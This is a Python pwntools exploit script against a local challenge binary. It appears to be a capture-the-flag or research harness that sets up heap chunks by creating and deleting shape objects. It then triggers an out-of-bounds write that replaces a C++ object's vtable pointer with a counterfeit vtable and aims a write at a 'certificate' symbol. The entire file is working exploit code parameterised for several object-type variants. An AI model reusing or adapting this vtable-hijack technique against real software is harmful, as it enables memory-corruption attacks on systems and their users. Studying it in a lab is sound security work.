from pwn import *
# context.log_level = 'debug'
class ckxprocess(process):
    def setfile(self):
        self.ff = open("./logsend.txt","w")
    def log(self,content):
        self.ff.write(content)
        self.ff.flush()
    def sendline(self,content):
        # print(content)
        self.log(content+"\n")
        super(ckxprocess,self).sendline(content)


p=ckxprocess("./chall")


p.setfile()


# p.sendline = sendlineckx

def setmaincontrol(num):
    p.recvuntil("Items:")
    p.sendline(str(num))


def create_shape(shape_type):
    setmaincontrol(1)
    p.recvuntil("choice")
    p.sendline(str(shape_type))


def delete_shape(shape_type):
    setmaincontrol(2)
    p.recvuntil("num")
    p.sendline(str(shape_type))
    pass
def trigger_vcall_render():
    setmaincontrol(3)
    # set
def create_banner(length,content):
    setmaincontrol(4)
    p.recvuntil("length")
    p.sendline(str(length))
    p.recvuntil("input banner")
    p.sendline(content)

def change_banner(content):
    setmaincontrol(5)
    p.recvuntil("Your new banner:")
    p.sendline(content)

    
def trigger_bug(content):
    setmaincontrol(6)
    p.recvuntil("Your Input:")
    p.sendline(content)

def check_pwn():
    setmaincontrol(7)
    content=p.recvuntil("RC\n")
    print(content)
    return content
def render():
    setmaincontrol(3)



def genexp(
    victim_type_num,
    counterfeit_type_num,
    chunk_range,
    oob_offset,
    overwrittern_data_size,
    critical_data_offset):


    # heap operation
    create_shape(victim_type_num) #0
    create_shape(victim_type_num) #1
    create_shape(victim_type_num) #2
    delete_shape(2) 
    create_banner(chunk_range-48-8,"ccccc") #1
    delete_shape(0) 


    elf =ELF("./chall")
    fake_vtable = elf.sym['_ZTV7shape'+str(counterfeit_type_num)]+0x10
    overwritten_ptr = p64(fake_vtable)
    certificate = elf.sym['certificate']
    write_target =p64(certificate)
    print(hex(certificate))


    # trigger_bug("l"*160+overwritten_ptr+write_target)
    assert(oob_offset+overwrittern_data_size-chunk_range>critical_data_offset)
    trigger_bug("l"*(chunk_range-oob_offset+critical_data_offset)+overwritten_ptr+write_target)

    # trigger_bug("llll")
    render()
    change_banner("2222")
    check_pwn()

    # create_banner()
    # change_banner("ooo")
    # check_pwn()
    # p.interactive()

if __name__ == "__main__":
    # genexp(
    #     victim_type_num=35,
    #     counterfeit_type_num=32,
    #     chunk_range=160,
    #     oob_offset = 0,
    #     overwrittern_data_size = 178,
    #     critical_data_offset = 0, # vptr 
    #     )

    # genexp(
    #     victim_type_num=11,
    #     counterfeit_type_num=25,
    #     chunk_range=160,
    #     oob_offset = 0,
    #     overwrittern_data_size = 178,
    #     critical_data_offset = 0, # vptr 
    #     )
    genexp(
        victim_type_num=3,
        counterfeit_type_num=11,
        chunk_range=160,
        oob_offset = 0,
        overwrittern_data_size = 178,
        critical_data_offset = 0, # vptr 
        )
